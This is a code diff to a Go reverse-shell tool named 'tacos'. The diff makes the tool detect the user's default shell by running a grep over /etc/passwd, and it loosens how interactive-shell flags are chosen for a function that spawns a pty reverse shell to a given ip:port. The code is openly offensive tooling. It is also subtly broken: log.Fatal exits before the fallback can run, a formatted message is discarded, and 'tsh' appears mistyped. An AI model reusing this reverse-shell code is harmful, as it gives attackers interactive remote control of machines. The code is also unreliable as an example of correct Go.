@@ -2,11 +2,13 @@ package tacos
 
 import (
 	"crypto/tls"
+	"fmt"
 	"io"
 	"log"
 	"os"
 	"os/exec"
 	"os/signal"
+	"strings"
 	"syscall"
 
 	"github.com/ariary/go-utils/pkg/logger"
@@ -14,14 +16,23 @@ import (
 	"golang.org/x/term"
 )
 
-//DefaultShell: return the default shell
-func DefaultShell() string {
+//DetectDefaultShell: return the default shell
+func DetectDefaultShell() string {
 	//Determine default shell
 	//macOS
 	//dscl . -read ~/ UserShell
 	//linux
 	//grep ^$(id -un): /etc/passwd | cut -d : -f 7-
-	return "/bin/bash"
+	command := "grep ^$(id -un): /etc/passwd | cut -d : -f 7-"
+	defaultShell, err := exec.Command("sh", "-c", command).Output()
+	if err != nil {
+		log.Fatal(err)
+		fmt.Sprintf("Failed to retrieve default shell, use sh %s", command)
+		return "/bin/sh"
+	}
+	shell := string(defaultShell)
+	shell = strings.ReplaceAll(shell, "\n", "")
+	return shell
 }
 
 //ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
@@ -36,12 +47,12 @@ func ReverseShell(host string, shell string) {
 	}
 
 	var args []string
-	switch shell {
-	case "bin/bash":
+	if strings.Contains(shell, "bash") {
 		args = append(args, "-li")
-	case "/bin/sh", "/bin/zsh", "/bin/csh", "/bin/tcsh":
+	} else if strings.Contains(shell, "zsh") || strings.Contains(shell, "csh") || strings.Contains(shell, "tsh") || strings.Contains(shell, "/sh") {
 		args = append(args, "-i")
 	}
+
 	cmd := exec.Command(shell, args...)
 
 	// Start the command with a pty.
